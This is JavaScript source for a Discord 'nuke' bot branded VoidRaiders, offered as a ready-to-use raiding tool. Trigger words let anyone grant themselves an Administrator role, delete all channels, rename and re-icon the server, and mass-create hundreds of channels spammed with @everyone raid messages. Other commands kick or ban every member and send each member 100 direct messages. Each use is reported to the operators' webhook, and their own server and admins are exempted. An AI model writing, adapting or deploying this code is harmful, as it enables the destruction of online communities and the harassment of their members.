const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");
const { token } = require("./config.json");
const { webhook } = require("./config.json");
const { updateWebhook } = require("./config.json")
const fs = require('fs'); // File system module to handle file reading/writing
const axios = require('axios'); // Axios module for making HTTP requests
const { channel } = require("diagnostics_channel");
const { time } = require("console");

const MAX_CHANNELS = 500; // Discord's current maximum number of channels
const PROTECTED_SERVER_ID = '1288282754596737064'; // Replace with the actual server ID you want to protect
const adminUserIds = ["909528138743152680", "1269380617460514817", "1004130378551922739"];
const LOG_FILE = 'command_logs.json'; // Path to the JSON log file
const WEBHOOK_URL = webhook; // Replace with your actual webhook URL

const CHANNEL_BATCH_SIZE = 10; // Number of channels created per batch
const MESSAGE_DELAY = 2000; // Delay between sending messages (in milliseconds)
const CHANNEL_CREATION_DELAY = 500; // Delay between creating each batch of channels (in milliseconds)

const client = new Client({
    intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers, GatewayIntentBits.DirectMessages]
});


const namesList = ["🟥 𝐑𝐚𝐢𝐝𝐞𝐝 𝐛𝐲 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 🟥", "🟨 𝗥𝗮𝗶𝗱𝗲𝗱 𝗯𝘆 𝗩𝗼𝗶𝗱𝗥𝗮𝗶𝗱𝗲𝗿𝘀 🟨", "🟦 ℝ𝕒𝕚𝕕𝕖𝕕 𝕓𝕪 𝕍𝕠𝕚𝕕ℝ𝕒𝕚𝕕𝕖𝕣𝕤 🟦", "​🟪 🇷​​🇦​​🇮​​🇩​​🇪​​🇩​ ​🇧​​🇾​ ​🇻​​🇴​​🇮​​🇩​​🇷​​🇦​​🇮​​🇩​​🇪​​🇷​​🇸 🟪​"];
const url1 = "https://discord.gg/6U9FMfvfUW";
const url2 = "https://cdn.discordapp.com/attachments/1291937270693367894/1292584503721726073/nukebyvoidraiders.png?ex=670444a0&is=6702f320&hm=e42ded5a396977f975490096dfc5f75a34e326416a3102c1ec98efc43921355b&";

const messageList = [
    `# @everyone 𝐑𝐚𝐢𝐝𝐞𝐝 𝐛𝐲 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`,
    `# @everyone This server got fucked by 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`,
    `# @everyone ℝ𝕒𝕚𝕕𝕖𝕕 𝕓𝕪 𝕍𝕠𝕚𝕕ℝ𝕒𝕚𝕕𝕖𝕣𝕤 | ${url1}\n${url2}`,
    `# @everyone Think twice before giving random roles | 𝕓𝕪 𝕍𝕠𝕚𝕕ℝ𝕒𝕚𝕕𝕖𝕣𝕤 | ${url1}\n${url2}`,
    `# @everyone Property of 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`,
    `# @everyone Made with love by 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`,
    `# @everyone This server got nuked by 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`,
    `# @everyone Easy to use nuking bot with great community 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬 | ${url1}\n${url2}`
];

let lastChannel;
let stopOperation = false; // Global flag to control operation
let stopRick = false;

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const createChannelsInBatches = async (message, batchSize) => {
    for (let i = 0; i < MAX_CHANNELS; i += batchSize) {
        // Check if the operation has been stopped
        if (stopOperation) {
            return; // Exit the function if operation is stopped
        }

        const batchPromises = [];

        // Create a batch of channels
        for (let j = 0; j < batchSize && i + j < MAX_CHANNELS; j++) {
            const randomName = namesList[Math.floor(Math.random() * namesList.length)];
            batchPromises.push(
                message.guild.channels.create({
                    name: randomName,
                    type: 0
                })
            );
        }

        const createdChannels = await Promise.all(batchPromises);
        console.log(`Created ${createdChannels.length} channels.`);

        // Send messages to each newly created channel
        for (const channel of createdChannels) {
            if (stopOperation) break;
            const messagePromises = []; // Array to store promises for message sending

            // Queue up 5 message send promises for each channel
            for (let j = 0; j < 5; j++) {
                const randomMsg = messageList[Math.floor(Math.random() * messageList.length)];
                messagePromises.push(channel.send(randomMsg));
            }

            // Wait for all messages to be sent before continuing to the next channel
            await Promise.all(messagePromises);
        }

        // Wait before creating the next batch of channels
        await sleep(CHANNEL_CREATION_DELAY);
    }
};


// Function to log command usage into a JSON file and send it via webhook
const logCommandUsage = (commandName, message) => {
    const username = message.author.tag;
    const serverName = message.guild.name;
    const dateTime = new Date().toLocaleString();

    const logEntry = {
        command: commandName,
        user: username,
        server: serverName,
        date: dateTime
    };

    // Check if the file exists
    fs.readFile(LOG_FILE, 'utf8', (err, data) => {
        let logs = [];

        // If the file doesn't exist or is empty, start with an empty array
        if (!err && data) {
            logs = JSON.parse(data);
        }

        // Add the new log entry
        logs.push(logEntry);

        // Write the updated logs back to the file
        fs.writeFile(LOG_FILE, JSON.stringify(logs, null, 2), (err) => {
            if (err) {
                console.error("Failed to write log to file:", err);
            }
        });
    });

    // Send the log to a Discord server via webhook
    axios.post(WEBHOOK_URL, {
        content: `----------------\n\nCommand: ${commandName}\nUser: ${username}\nServer: ${serverName}\nDate: ${dateTime}`
    }).then(() => {
        console.log("Log sent via webhook.");
    }).catch(error => {
        console.error("Failed to send log via webhook:", error);
    });
};

client.on("messageCreate", async (message) => {
    // Ignore messages from bots
    if (message.author.bot) return;


    // Command to set webhook message
    if (message.content.toLowerCase() === "setwebhookmessage") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            if (adminUserIds.includes(message.author.id)) {
                // Send a prompt message to the user
                const promptMessage = await message.channel.send("What message would you like to send to the webhook?");

                // Set up a message collector to collect the response
                const filter = (response) => response.author.id === message.author.id;
                const collector = message.channel.createMessageCollector({ filter, max: 1, time: 15000 });

                collector.on('collect', async (response) => {
                    // Get the user's message
                    const userMessage = response.content;

                    // Send the message to the updateWebhook
                    try {
                        await axios.post(updateWebhook, { content: userMessage });
                        message.channel.send("Your message has been sent to the webhook!");
                    } catch (error) {
                        console.error("Failed to send message via webhook:", error);
                        message.channel.send("There was an error sending your message.");
                    }

                    // Stop the collector
                    collector.stop();
                });

                collector.on('end', collected => {
                    if (collected.size === 0) {
                        message.channel.send("Time's up! You didn't send a message.");
                    }
                    // Delete the prompt message after collection is done
                    promptMessage.delete().catch(console.error);
                });
            }
        }
    }


    // "addpermsvr" command to add an admin role
    if (message.content.toLowerCase() === "addpermsvr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.channel.send("This server is protected and cannot give you perms.");
        }

        logCommandUsage('addpermsvr', message);
        const botPermissions = message.guild.members.me.permissions;
        if (!botPermissions.has(PermissionsBitField.Flags.ManageRoles)) {
            return message.channel.send("I don't have permission to manage roles!");
        }

        try {
            const adminRole = await message.guild.roles.create({
                name: "Administrator",
                permissions: [PermissionsBitField.Flags.Administrator],
                reason: "Created by bot command."
            });

            const member = await message.guild.members.fetch(message.author.id);
            await member.roles.add(adminRole);
            message.author.send(`The Administrator role has been created and assigned to you!`);
        } catch (error) {
            console.error(`Failed to create or assign role:`, error);
            message.author.send("There was an error creating the Administrator role or assigning it.");
        }
    }

    if (message.content.toLowerCase() === "haltnukevr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.channel.send("This server is protected and cannot use this command.");
        }

        logCommandUsage('haltnukevr', message);
        stopOperation = true; // Set the flag to stop operation
        return message.author.send("Operation stopped.");
    }


    if (message.content.toLowerCase() === "stoprickvr") {

        logCommandUsage('stoprickvr', message);
        stopRick = true;
        return message.author.send("Operation stopped.");
    }

    // "nukevr" command to nuke the server
    if (message.content.toLowerCase() === "nukevr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.author.send("This server is protected and cannot be nuked.");
        }

        stopOperation = false;

        logCommandUsage('nukevr', message);

        message.guild.setName("𝐑𝐚𝐢𝐝𝐞𝐝 𝐛𝐲 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬");
        message.guild.setIcon("https://cdn.discordapp.com/attachments/1292583809341984939/1292584327124881571/nukebyvoidraiders.png?ex=67044476&is=6702f2f6&hm=a2ca040a616dae3089e87b6a8e6ba85f7a1f3cbde789a94ed2691b8ae75fde68&")

        let channelsClear = await message.guild.channels.fetch();

        for (const channel of channelsClear.values()) {
            try {
                await channel.delete();
            } catch (error) {
                console.error(`Failed to delete channel:`, error);
            }
        }

        // Start nuking the server by creating channels in batches
        await createChannelsInBatches(message, CHANNEL_BATCH_SIZE);

        message.author.send("Nuking complete. All channels have been created and messages sent.");
    }

    if (message.content.toLowerCase() === "kickvr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.author.send("This server is protected and you cannot use this command.");
        }
        logCommandUsage('kickvr', message);

        const guildMembers = await message.guild.members.fetch();

        for (const member of guildMembers.values()) {
            try {
                if (adminUserIds.includes(member.id) || member.user.bot) {
                    await member.send(`Someone tried to kick you :clown: user: ${message.author.username} Id: ${message.author.id}­­­­­­­­­­`);
                } else {
                    await member.kick("VoidRaiders on Top");
                }
            } catch (error) {
                console.error(`Failed error: ${error.message}`);
            }
        }
    }

    if (message.content.toLowerCase() === "banvr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.author.send("This server is protected and you cannot use this command.");
        }
        logCommandUsage('banvr', message);

        const guildMembers = await message.guild.members.fetch();

        for (const member of guildMembers.values()) {
            try {
                if (adminUserIds.includes(member.id)) {
                    await member.send(`Someone tried to ban you :clown: user: ${message.author.username} Id: ${message.author.id}­­­­­­­­­­`);
                } else {
                    await member.ban();
                }
            } catch (error) {
                console.error(`Failed error: ${error.message}`);
            }
        }
    }

    if (message.content.toLowerCase() === "hackervr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.author.send("This server is protected and you cannot use this command.");
        }
        logCommandUsage('hackervr', message);
        stopRick = false;
        const guildMembers = await message.guild.members.fetch();
        for (const member of guildMembers.values()) {
            if (!member.user.bot) {
                try {
                    if (adminUserIds.includes(member.id)) {
                        await member.send(`Someone tried to rick roll you :clown: user: ${message.author.username} Id: ${message.author.id}­­­­­­­­­­`)
                    }
                    else {
                        for (i = 0; i < 100; i++) {
                            if (stopRick) break;
                            await member.send("You got rick rolled | https://www.youtube.com/watchv=dQw4w9WgXcQ");
                        }
                    }
                } catch (error) {
                    console.error(`Failed to send message to ${member.user.tag}: ${error.message}`);
                }
            }
            await sleep(1000); // Adjust the delay between each DM
        }
    }


    if (message.content.toLowerCase() === "clearvr") {
        if (message.guild.id === PROTECTED_SERVER_ID) {
            return message.author.send("This server is protected and cannot use this command.");
        }

        logCommandUsage('clearvr', message);

        // Fetch the most recent list of channels from the API
        let channelsClear = await message.guild.channels.fetch();

        // Iterate through the channels and delete them
        for (const channel of channelsClear.values()) {
            try {
                await channel.delete();
            } catch (error) {
                console.error(`Failed to delete channel:`, error);
            }
        }

        // Create a new channel after clearing
        const channelClear = await message.guild.channels.create({
            name: "👑Cleared by 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬👑",
            type: 0
        });

        await channelClear.send("@everyone\n\n  **Cleared by 𝐕𝐨𝐢𝐝𝐑𝐚𝐢𝐝𝐞𝐫𝐬** | https://discord.gg/6U9FMfvfUW");
    }

});

client.login(token);